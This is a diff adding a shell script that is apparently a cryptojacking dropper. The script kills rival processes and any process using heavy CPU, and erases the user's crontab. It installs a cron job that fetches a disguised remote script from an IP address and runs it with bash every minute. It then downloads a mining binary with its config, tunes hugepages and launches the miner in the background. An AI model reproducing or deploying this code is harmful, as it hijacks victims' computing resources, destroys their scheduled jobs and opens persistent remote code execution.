@@ -1,0 +1,29 @@
+#!/bin/sh
+pkill -f 158.69.133.18
+pkill -f suppoie
+ps aux | grep -vw sustse | awk '{if($3>40.0) print $2}' | while read procid
+do
+kill -9 $procid
+done
+rm -rf /dev/shm/jboss
+ps -fe|grep -w sustse |grep -v grep
+if [ $? -eq 0 ]
+then
+pwd
+else
+crontab -r || true && \
+echo "* * * * * curl -s http://192.99.142.235:8220/logo9.jpg | bash -s" >> /tmp/cron || true && \
+crontab /tmp/cron || true && \
+rm -rf /tmp/cron || true && \
+curl -o /var/tmp/config.json http://192.99.142.235:8220/3.json
+curl -o /var/tmp/sustse http://192.99.142.235:8220/rig
+chmod 777 /var/tmp/sustse
+cd /var/tmp
+proc=`grep -c ^processor /proc/cpuinfo`
+cores=$((($proc+1)/2))
+num=$(($cores*3))
+/sbin/sysctl -w vm.nr_hugepages=`$num`
+nohup ./sustse -c config.json -t `echo $cores` >/dev/null &
+fi
+sleep 3
+echo "runing....."
